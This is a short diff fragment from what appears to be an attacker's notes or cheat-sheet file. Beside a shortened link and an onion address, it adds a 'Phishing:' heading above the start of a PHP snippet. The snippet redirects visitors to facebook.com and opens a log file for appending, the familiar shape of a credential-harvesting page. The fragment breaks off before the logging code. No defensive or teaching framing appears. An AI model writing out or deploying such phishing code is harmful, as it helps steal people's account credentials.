@@ -84,6 +84,8 @@ https://tinyurl.com/y2soyc6g
 http://3g2upl4pq6kufc4m.onion/
 
 
+Phishing:
+
 <?php
 header ('Location: facebook.com');
 $handle = fopen("log.txt", "a");
